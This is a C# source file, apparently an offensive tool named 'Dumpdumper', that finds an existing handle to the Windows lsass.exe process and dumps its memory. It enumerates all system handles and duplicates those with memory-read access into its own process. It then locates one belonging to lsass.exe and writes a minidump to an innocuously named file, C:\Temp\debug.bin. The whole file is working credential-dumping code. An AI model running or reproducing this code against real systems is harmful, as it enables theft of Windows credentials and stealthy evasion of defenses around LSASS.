using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Dumpdumper
{
    public class HandleEnum
    {

        public static void Main(string[] args)
        {
            // bogus initial length value, this size wont be enough and will be filled
            // with the true value of the buffer inside the while loop
            var systemInformationBufferLength = 0x10000;

            // allocate the buffer that will contain the SYSTEM_HANDLE_INFORMATION struct,
            var systemInformationBufferPtr = Marshal.AllocHGlobal(systemInformationBufferLength);
            var trueBufferLength = 0;

            // NtQuerySystemInformation will return STATUS_INFO_LENGTH_MISMATCH if 
            // the information buffer was given with the wrong size
            Structs.NTSTATUS queryResult = PInvoke.NtQuerySystemInformation(Structs.SYSTEM_INFORMATION_CLASS.SystemHandleInformation, systemInformationBufferPtr, systemInformationBufferLength, out trueBufferLength);


            while (queryResult == Structs.NTSTATUS.InfoLengthMismatch)
            {
                //Console.WriteLine(queryResult);
                // get the true information buffer length returned by the QuerySystem API
                systemInformationBufferLength = trueBufferLength;

                // free the previous allocated information buffer with wrong size
                Marshal.FreeHGlobal(systemInformationBufferPtr);

                // allocate new memory region with the true size
                systemInformationBufferPtr = Marshal.AllocHGlobal(systemInformationBufferLength);

                queryResult = PInvoke.NtQuerySystemInformation(Structs.SYSTEM_INFORMATION_CLASS.SystemHandleInformation, systemInformationBufferPtr, systemInformationBufferLength, out trueBufferLength);
            }

            // should print Success
            //Console.WriteLine(queryResult);
            var numberOfHandles = Marshal.ReadInt64(systemInformationBufferPtr);
            //Console.WriteLine(numberOfHandles);

            // create a pointer to the address containing the handles struct +
            // 8 bytes, which is the size of the variable containing number of handles
            var handleEntryPtr = new IntPtr((long)systemInformationBufferPtr + sizeof(long));

            // create a dictionary to store all handles by process id
            Dictionary<int, List<Structs.SYSTEM_HANDLE_TABLE_ENTRY_INFO>> allHandles = new();

            // go through every handle, check if it is already stored on the dictionary
            // if not, add it with the PID responsible for the handle as key
            // one PID can have multiple handles opened
            for (var i = 0; i < numberOfHandles; i++)
            {
                // serializes the memory position containing the current handle
                // into a variable of type struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
                var currentHandle = (Structs.SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(handleEntryPtr, typeof(Structs.SYSTEM_HANDLE_TABLE_ENTRY_INFO));

                // increases the memory position we are pointing in the list of all handles
                // to the next handle (our current position + the size of the current handle)
                handleEntryPtr = new IntPtr((long)handleEntryPtr + Marshal.SizeOf(currentHandle));

                // check if our dictionary already contains handles from the current PID
                if (!allHandles.ContainsKey(currentHandle.UniqueProcessId))
                    allHandles.Add(currentHandle.UniqueProcessId, new List<Structs.SYSTEM_HANDLE_TABLE_ENTRY_INFO>());

                // add the current handle to our dictionary
                allHandles[currentHandle.UniqueProcessId].Add(currentHandle);
            }
            Marshal.FreeHGlobal(systemInformationBufferPtr);

            // create a dictionary to store all duped handles by parent process id
            Dictionary<int, List<IntPtr>> allDupedHandles = new();

            // open a handle to our current process so we can duplicate the handles into it
            var hCurrentProcess = IntPtr.Zero;
            int currentProcessID = Process.GetCurrentProcess().Id;
            hCurrentProcess = PInvoke.OpenProcess(Structs.PROCESS_ACCESS.PROCESS_ALL_ACCESS, false, currentProcessID);

            // roll through every PID contained in the dictionary
            // check if any of its handles has PROCESS_VM_READ permission
            foreach (var currentPidHandleList in allHandles)
            {
                var pid = currentPidHandleList.Key;
                var currentPidHandles = currentPidHandleList.Value;                          

                // check every handle on the system for handles with PROCESS_VM_READ permission
                // which will allows us to read process memory
                // if the handle contains the permission, we open the process that owns it
                // with the PROCESS_DUP_HANDLE mask so we can duplicate its handles
                foreach (var handle in currentPidHandles)
                {
                    var grantedAccess = (Structs.PROCESS_ACCESS)handle.AccessMask;
                    if (!grantedAccess.HasFlag(Structs.PROCESS_ACCESS.PROCESS_VM_READ)) continue;

                    var hParentProcess = IntPtr.Zero;
                    if (hParentProcess == IntPtr.Zero)
                        hParentProcess = PInvoke.OpenProcess(Structs.PROCESS_ACCESS.PROCESS_DUP_HANDLE, false, pid);

                    // duplicate handle and assign it to our process
                    if (hParentProcess != IntPtr.Zero)
                    {
                        var hDuplicatedHandle = IntPtr.Zero;
                        var status = PInvoke.NtDuplicateObject(
                            hParentProcess,
                            new IntPtr(handle.HandleValue),
                            hCurrentProcess,
                            out hDuplicatedHandle,
                            Structs.PROCESS_ACCESS.PROCESS_QUERY_INFORMATION | Structs.PROCESS_ACCESS.PROCESS_VM_READ,
                            false,
                            Structs.DuplicateOptions.DUPLICATE_SAME_ACCESS);

                        // skip if we failed to duplicate
                        if (status != Structs.NTSTATUS.Success || hDuplicatedHandle == IntPtr.Zero) continue;

                        // check if our dictionary already contains duped handles from the current PID
                        if (!allDupedHandles.ContainsKey(pid))
                            allDupedHandles.Add(pid, new List<IntPtr>());

                        // add the current duped handle to our dictionary
                        allDupedHandles[pid].Add(hDuplicatedHandle);
                    }

                // free handles to our process and duplicated process
                    PInvoke.CloseHandle(hParentProcess);

                }
            }            
            PInvoke.CloseHandle(hCurrentProcess);

            // go through all duped handles we opened on our process
            // query the object(handle), check if it is a process handle
            // and print the process name
            var desiredHandle = IntPtr.Zero;
            foreach (var dupedHandle in allDupedHandles)
            {
                var pid = dupedHandle.Key;
                var currentDupedHandle = dupedHandle.Value; 

                foreach (var handle in currentDupedHandle)
                {
                    var objTypeInfo = new Structs.OBJECT_TYPE_INFORMATION();
                    var objTypeBufferLength = Marshal.SizeOf(objTypeInfo);
                    var objTypeBufferPtr = Marshal.AllocHGlobal(objTypeBufferLength);
                    trueBufferLength = 0;

                    queryResult = PInvoke.NtQueryObject(handle, Structs.OBJECT_INFORMATION_CLASS.ObjectTypeInformation, objTypeBufferPtr, objTypeBufferLength, out trueBufferLength);

                    while (queryResult == Structs.NTSTATUS.InfoLengthMismatch)
                    {
                        objTypeBufferLength = trueBufferLength;

                        // free the previous allocated information buffer with wrong size
                        Marshal.FreeHGlobal(objTypeBufferPtr);

                        // allocate new memory region with the true size
                        objTypeBufferPtr = Marshal.AllocHGlobal(objTypeBufferLength);

                        queryResult = PInvoke.NtQueryObject(handle, Structs.OBJECT_INFORMATION_CLASS.ObjectTypeInformation, objTypeBufferPtr, objTypeBufferLength, out trueBufferLength);
                    }

                    // unmarshall handle object pointer into struct
                    objTypeInfo = (Structs.OBJECT_TYPE_INFORMATION)Marshal.PtrToStructure(objTypeBufferPtr, typeof(Structs.OBJECT_TYPE_INFORMATION));
                    Marshal.FreeHGlobal(objTypeBufferPtr);

                    // parses handle object name 
                    var objTypeInfoName = new byte[objTypeInfo.Name.Length];
                    Marshal.Copy(objTypeInfo.Name.Buffer, objTypeInfoName, 0, objTypeInfo.Name.Length);
                    var typeName = Encoding.Unicode.GetString(objTypeInfoName);
                    
                    if (typeName.Equals("Process", StringComparison.OrdinalIgnoreCase))
                    {
                        String processName = "";
                        StringBuilder buffer = new StringBuilder(1024);
                        int size = buffer.Capacity;
                        var exeName = PInvoke.QueryFullProcessImageName(handle, 0, buffer, out size);
                        processName = buffer.ToString();
                        Console.WriteLine(processName);

                        if (processName.EndsWith("lsass.exe"))
                        {
                            Console.WriteLine("Found open handle to Target Process. From PID: {0}", pid);
                            //Console.WriteLine(processName);
                            desiredHandle = handle;
                            break;
                        }
                        
                    }
                }
            }
            // Use the found open handle to dump the process memory
            using var fs = new FileStream(@"C:\Temp\debug.bin", FileMode.Create);
            if (!PInvoke.MiniDumpWriteDump(desiredHandle, 0, fs.SafeFileHandle, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
            {
                var error = new Win32Exception(Marshal.GetLastWin32Error());
                Console.WriteLine("MiniDumpWriteDump failed. {0}", error.Message);
                Console.ReadKey();
            }
            else
            {
                Console.WriteLine("MiniDumpWriteDump successful.");
                Console.ReadKey();
                return;
            }
            
        }
            
    }
}